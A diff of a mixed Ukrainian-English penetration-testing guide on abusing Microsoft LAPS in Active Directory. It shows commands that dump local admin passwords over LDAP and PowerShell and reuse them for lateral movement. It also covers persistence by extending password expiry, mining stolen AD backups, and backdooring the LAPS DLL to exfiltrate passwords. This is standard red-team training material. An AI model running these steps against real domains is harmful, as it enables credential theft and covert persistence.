@@ -5,16 +5,16 @@
 
 ## Basic Information
 
-Наразі під час assessment можна зустріти **2 LAPS flavour**:
+Наразі під час assessment можна зустріти **2 LAPS flavours**:
 
-- **Legacy Microsoft LAPS**: зберігає пароль локального адміністратора в **`ms-Mcs-AdmPwd`** та час завершення дії в **`ms-Mcs-AdmPwdExpirationTime`**.
-- **Windows LAPS** (вбудований у Windows починаючи з оновлень April 2023): усе ще може emulates legacy mode, але в native mode використовує атрибути **`msLAPS-*`**, підтримує **password encryption**, **password history** і **DSRM password backup** для domain controllers.
+- **Legacy Microsoft LAPS**: зберігає пароль локального адміністратора в **`ms-Mcs-AdmPwd`** і час завершення дії в **`ms-Mcs-AdmPwdExpirationTime`**.
+- **Windows LAPS** (вбудовано в Windows починаючи з оновлень квітня 2023): усе ще може емулювати legacy mode, але в native mode використовує атрибути **`msLAPS-*`**, підтримує **password encryption**, **password history** і **DSRM password backup** для domain controllers.
 
-LAPS призначений для керування **local administrator passwords**, роблячи їх **унікальними, randomized і frequently changed** на computers, приєднаних до domain. Якщо ви можете читати ці атрибути, зазвичай можна **pivot as the local admin** до ураженого host. У багатьох environments цікаво не лише прочитати сам пароль, а й з'ясувати, **кому було delegated access** до password attributes.
+LAPS призначений для керування **local administrator passwords**, роблячи їх **unique, randomized, and frequently changed** на комп'ютерах, приєднаних до domain. Якщо ви можете читати ці атрибути, зазвичай можна **pivot as the local admin** до ураженого host. У багатьох середовищах цікаво не лише прочитати сам password, а й знайти **who was delegated access** до атрибутів password.
 
 ### Legacy Microsoft LAPS attributes
 
-У computer objects домену реалізація legacy Microsoft LAPS призводить до додавання двох атрибутів:
+В computer objects домену реалізація legacy Microsoft LAPS додає два атрибути:
 
 - **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
 - **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**
@@ -23,14 +23,14 @@ LAPS призначений для керування **local administrator pass
 
 Native Windows LAPS додає кілька нових атрибутів до computer objects:
 
-- **`msLAPS-Password`**: clear-text password blob, що зберігається як JSON, коли encryption не увімкнено
-- **`msLAPS-PasswordExpirationTime`**: запланований час завершення дії
+- **`msLAPS-Password`**: clear-text password blob, що зберігається як JSON, коли encryption не ввімкнено
+- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
 - **`msLAPS-EncryptedPassword`**: encrypted current password
 - **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
 - **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data для domain controllers
-- **`msLAPS-CurrentPasswordVersion`**: version tracking на основі GUID, який використовується новішою rollback-detection logic (Windows Server 2025 forest schema)
+- **`msLAPS-CurrentPasswordVersion`**: GUID-based version tracking, що використовується новішою rollback-detection logic (Windows Server 2025 forest schema)
 
-Коли **`msLAPS-Password`** readable, значенням є JSON object, що містить account name, update time і clear-text password, наприклад:
+Коли **`msLAPS-Password`** можна прочитати, значення є JSON object, що містить account name, update time і clear-text password, наприклад:
 ```json
 {"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
 ```
@@ -58,13 +58,13 @@ select DnsHostname
 Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
 select DnsHostname
 ```
-## Доступ до пароля LAPS
+## LAPS Password Access
 
-Ви можете **завантажити raw LAPS policy** з `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, а потім використати **`Parse-PolFile`** з пакета [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), щоб перетворити цей файл у формат, зрозумілий для людини.
+Ви можете **завантажити raw LAPS policy** з `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, а потім використати **`Parse-PolFile`** з пакета [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), щоб перетворити цей файл у human-readable format.
 
 ### Legacy Microsoft LAPS PowerShell cmdlets
 
-Якщо legacy LAPS module встановлено, зазвичай доступні такі cmdlets:
+If the legacy LAPS module is installed, the following cmdlets are usually available:
 ```bash
 Get-Command *AdmPwd*
 
@@ -87,7 +87,7 @@ Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
 ### Windows LAPS PowerShell cmdlets
 
-У Windows LAPS є новий модуль PowerShell і нові cmdlets:
+Native Windows LAPS постачається з новим модулем PowerShell і новими cmdlets:
 ```bash
 Get-Command *Laps*
 
@@ -102,17 +102,24 @@ Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory
 
 # Query DSRM password from a DC object
 Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
-```
-Кілька операційних деталей тут важливі:
 
-- **`Get-LapsADPassword`** автоматично обробляє **legacy LAPS**, **clear-text Windows LAPS** та **encrypted Windows LAPS**.
-- Якщо пароль **encrypted** і ви можете **read**, але не **decrypt** його, cmdlet повертає metadata, але не clear-text password.
-- **Password history** доступна лише коли увімкнено **Windows LAPS encryption**.
-- На domain controllers повернене джерело може бути **`EncryptedDSRMPassword`**.
+# Use alternate credentials for an authorized decryptor
+$cred = Get-Credential CONTOSO\LAPSDecryptor
+Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
+```
+Кілька операційних деталей тут мають значення:
+
+- **`Get-LapsADPassword`** автоматично обробляє **legacy LAPS**, **clear-text Windows LAPS** і **encrypted Windows LAPS**.
+- Якщо пароль зашифрований і ви можете **читати** його, але не **decrypt** його, cmdlet повертає метадані, такі як **`Source`**, **`DecryptionStatus`** і **`AuthorizedDecryptor`**, навіть якщо не може повернути clear-text пароль.
+- В **encrypted Windows LAPS**, **read permission** і **decrypt permission** — це **різні controls**. Наявність OU / object read access не означає, що ви автоматично можете decrypt **`msLAPS-EncryptedPassword`**.
+- **Password history** доступна лише тоді, коли увімкнено **Windows LAPS encryption**.
+- На domain controllers, повернене source може бути **`EncryptedDSRMPassword`**.
+
+Це корисно під час assessment, тому що поле **`AuthorizedDecryptor`** показує, **для якого user або group було зашифровано blob**, часто перетворюючи невдале читання password на новий target для privilege-escalation.
 
 ### PowerView / LDAP
 
-**PowerView** також можна використати, щоб з’ясувати, **хто може read the password і прочитати його**:
+**PowerView** також можна використати, щоб з’ясувати, **хто може читати password і прочитати його**:
 ```bash
 # Legacy Microsoft LAPS: find principals with rights over the OU
 Find-AdmPwdExtendedRights -Identity Workstations | fl
@@ -123,11 +130,18 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpira
 # Native Windows LAPS clear-text mode
 Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
 ```
-If **`msLAPS-Password`** readable, parse the returned JSON and extract **`p`** for the password and **`n`** for the managed local admin account name.
+Якщо **`msLAPS-Password`** є читабельним, розберіть повернений JSON і витягніть **`p`** для пароля та **`n`** для імені керованого локального облікового запису адміністратора.
+```bash
+# Extract both the password and the real managed account name
+$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
+$laps.n
+$laps.p
+```
+Це поле **`n`** має значення в новіших розгортаннях, тому що **Windows LAPS automatic account management** може націлювати **custom account** замість вбудованого **`Administrator`**, а новіші системи **Windows 11 24H2 / Windows Server 2025** можуть навіть **randomize** назву цього account.
 
 ### Linux / remote tooling
 
-Сучасні інструменти підтримують як legacy Microsoft LAPS, так і Windows LAPS.
+Modern tooling підтримує як legacy Microsoft LAPS, так і Windows LAPS.
 ```bash
 # NetExec / CrackMapExec lineage: dump LAPS values over LDAP
 nxc ldap 10.10.10.10 -u user -p password -M laps
@@ -148,21 +162,23 @@ get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
 ```
 Примітки:
 
-- Останні збірки **NetExec** підтримують **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** і **`msLAPS-EncryptedPassword`**.
-- **`pyLAPS`** досі корисний для **legacy Microsoft LAPS** з Linux, але він працює лише з **`ms-Mcs-AdmPwd`**.
-- Якщо середовище використовує **encrypted Windows LAPS**, простого LDAP read недостатньо; також потрібно бути **authorized decryptor** або використати підтримуваний шлях decrypt.
+- Нові збірки **NetExec** підтримують **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** і **`msLAPS-EncryptedPassword`**.
+- **`pyLAPS`** усе ще корисний для **legacy Microsoft LAPS** з Linux, але він цілить лише в **`ms-Mcs-AdmPwd`**.
+- Новіші cross-platform інструменти, такі як **`LAPS4LINUX`**, інструменти на базі **`dpapi-ng`**, а також нещодавні workflows **NetExec** можуть також обробляти **native Windows LAPS** з non-Windows хостів.
+- Якщо середовище використовує **encrypted Windows LAPS**, простого LDAP read недостатньо; вам також потрібно бути **authorized decryptor** (або мати еквівалентний матеріал для дешифрування, наприклад offline domain DPAPI-NG root key material).
+- На **Windows 11 24H2 / Windows Server 2025** не припускайте, що managed local admin завжди **`Administrator`**. Automatic account management може створити custom account і за потреби randomize його ім’я, тож спочатку дізнайтеся ім’я акаунта через **`n`** / **`Account`** перед використанням **`--laps`** у масштабі.
 
 ### Зловживання directory synchronization
 
-Якщо у вас є права **directory synchronization** на рівні домену замість прямого read access до кожного об’єкта комп’ютера, LAPS все одно може бути цікавим.
+Якщо у вас є domain-level права **directory synchronization** замість прямого read access на кожному computer object, LAPS усе одно може бути цікавим.
 
-Комбінацію **`DS-Replication-Get-Changes`** з **`DS-Replication-Get-Changes-In-Filtered-Set`** або **`DS-Replication-Get-Changes-All`** можна використати для синхронізації **confidential / RODC-filtered** атрибутів, таких як legacy **`ms-Mcs-AdmPwd`**. BloodHound моделює це як **`SyncLAPSPassword`**. Дивіться [DCSync](dcsync.md) для контексту щодо replication-rights.
+Комбінація **`DS-Replication-Get-Changes`** з **`DS-Replication-Get-Changes-In-Filtered-Set`** або **`DS-Replication-Get-Changes-All`** може використовуватися для synchronizе **confidential / RODC-filtered** атрибутів, таких як legacy **`ms-Mcs-AdmPwd`**. BloodHound моделює це як **`SyncLAPSPassword`**. Дивіться [DCSync](dcsync.md) для background про replication-rights.
 
 ## LAPSToolkit
 
-[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) спрощує enumeration LAPS за допомогою кількох функцій.\
-Одна з них — parsing **`ExtendedRights`** для **всіх computer objects, у яких увімкнено LAPS.** Це показує **groups**, яким явно **delegated to read LAPS passwords**, і це часто users у protected groups.\
-**Account**, який **joined a computer** до домену, отримує `All Extended Rights` над цим host, і це право дає **account** можливість **read passwords**. Enumeration може показати user account, який може read LAPS password на host. Це може допомогти нам **target specific AD users** who can read LAPS passwords.
+[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) полегшує enumeration LAPS за допомогою кількох функцій.\
+Одна з них — парсинг **`ExtendedRights`** для **всіх computers із увімкненим LAPS.** Це показує **groups**, яким спеціально **delegated to read LAPS passwords**, і це часто користувачі в protected groups.\
+**Account**, який **приєднав computer** до domain, отримує `All Extended Rights` над цим host, і це право дає **account** можливість **read passwords**. Enumeration може показати user account, який може read LAPS password на host. Це може допомогти нам **target specific AD users**, які можуть read LAPS passwords.
 ```bash
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -186,7 +202,7 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## Дамп LAPS Passwords With NetExec / CrackMapExec
+## Дамп паролів LAPS за допомогою NetExec / CrackMapExec
 
 Якщо у вас немає інтерактивного PowerShell, ви можете зловживати цим привілеєм віддалено через LDAP:
 ```bash
@@ -196,9 +212,9 @@ crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 # Current project name / syntax
 nxc ldap 10.10.10.10 -u user -p password -M laps
 ```
-This dumps all the LAPS secret-и, які користувач може читати, дозволяючи вам рухатися lateral-но з іншим паролем локального адміністратора.
+Це вивантажує всі LAPS secrets, які користувач може read, allowing you to move laterally з іншим local administrator password.
 
-## Використання LAPS Password
+## Using LAPS Password
 ```bash
 xfreerdp /v:192.168.1.1:3389 /u:Administrator
 Password: 2Z@Ae)7!{9#Cq
@@ -206,11 +222,11 @@ Password: 2Z@Ae)7!{9#Cq
 python psexec.py Administrator@web.example.com
 Password: 2Z@Ae)7!{9#Cq
 ```
-## Підтримка LAPS
+## LAPS Persistence
 
-### Дата закінчення
+### Expiration Date
 
-Після отримання admin, можна **отримати паролі** і **запобігти** тому, щоб машина **оновлювала** свій **password**, **встановивши дату закінчення в майбутнє**.
+Після отримання admin, можна **отримати passwords** і **запобігти** тому, щоб machine **оновлювала** свій **password**, **встановивши дату закінчення дії на майбутнє**.
 
 Legacy Microsoft LAPS:
 ```bash
@@ -221,7 +237,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 ## SYSTEM on the computer is needed
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
-Native Windows LAPS використовує **`msLAPS-PasswordExpirationTime`** замість цього:
+Native Windows LAPS використовує **`msLAPS-PasswordExpirationTime`** натомість:
 ```bash
 # Read the current expiration timestamp
 Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime
@@ -230,11 +246,23 @@ Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime
 Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
 ```
 > [!WARNING]
-> Пароль усе ще буде змінено, якщо **admin** використовує **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, або якщо ввімкнено **Do not allow password expiration time longer than required by policy**.
+> Пароль все одно буде обертатися, якщо **admin** використовує **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, або якщо увімкнено **Do not allow password expiration time longer than required by policy**.
 
-### Recovering historical passwords from AD backups
+### Caveat щодо rollback snapshot на новішому Windows LAPS
 
-Коли увімкнено **Windows LAPS encryption + password history**, змонтовані AD backups можуть стати додатковим джерелом secrets. Якщо ви можете отримати доступ до змонтованого AD snapshot і використати **recovery mode**, ви можете запитувати старі збережені паролі без звернення до live DC.
+Старі трюки зі **snapshot / image rollback** є **менш надійними** проти сучасних розгортань **Windows LAPS**. На **Windows 11 24H2 / Windows Server 2025**, якщо схема forest містить **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), client порівнює локально кешований GUID зі значенням, що зберігається в AD, і **негайно обертає пароль**, коли rollback створює **torn state**.
+
+На практиці це означає, що persistence на основі snapshot або спроби відновити старий відомий local admin password можуть швидко згоріти замість того, щоб пережити до наступного звичайного expiration.
+
+Цей захист застосовується лише до **AD-backed Windows LAPS** і все ще залежить від того, чи може відновлена машина **authenticate back to AD**. Якщо машина більше не може спілкуватися з AD, **password history** або **AD backup access** все ще можуть врятувати ситуацію.
+
+### Caveat щодо tamper автоматичного керування account
+
+Коли увімкнено **automatic account management**, Windows LAPS керує життєвим циклом керованого local admin account. Неочікувані спроби перейменувати, переналаштувати або іншим чином втручатися в цей account можуть бути відхилені з **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, тож persistence, яка залежить від непомітного зміни керованого LAPS account, є менш надійною на новіших endpoints.
+
+### Відновлення historical passwords з AD backups
+
+Коли увімкнено **Windows LAPS encryption + password history**, змонтовані AD backups можуть стати додатковим джерелом secrets. Якщо ви можете отримати доступ до змонтованого AD snapshot і використовувати **recovery mode**, ви можете запитувати старі збережені passwords без звернення до live DC.
 ```bash
 # Query a mounted AD snapshot on port 50000
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode
@@ -242,18 +270,20 @@ Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode
 # Historical entries if history is enabled
 Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
 ```
-Це здебільшого актуально під час **AD backup theft**, **offline forensics abuse** або **disaster-recovery media access**.
+Це переважно актуально під час **AD backup theft**, **offline forensics abuse** або **disaster-recovery media access**.
 
 ### Backdoor
 
-Оригінальний вихідний код для legacy Microsoft LAPS можна знайти [here](https://github.com/GreyCorbel/admpwd), тому можливо додати backdoor у код (наприклад, всередині методу `Get-AdmPwdPassword` у `Main/AdmPwd.PS/Main.cs`), який якимось чином **exfiltrate нові паролі або зберігатиме їх десь**.
+Оригінальний вихідний код для legacy Microsoft LAPS можна знайти [here](https://github.com/GreyCorbel/admpwd), тому можна додати backdoor у код (наприклад, всередині методу `Get-AdmPwdPassword` у `Main/AdmPwd.PS/Main.cs`), який якимось чином **exfiltrate нові паролі або зберігатиме їх десь**.
 
-Потім скомпілюйте новий `AdmPwd.PS.dll` і завантажте його на машину в `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (і змініть час модифікації).
+Потім скомпілюйте новий `AdmPwd.PS.dll` і завантажте його на машину в `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (і змініть modification time).
 
 ## References
 
 - [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
 - [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
+- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
+- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
 - [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)
 
 
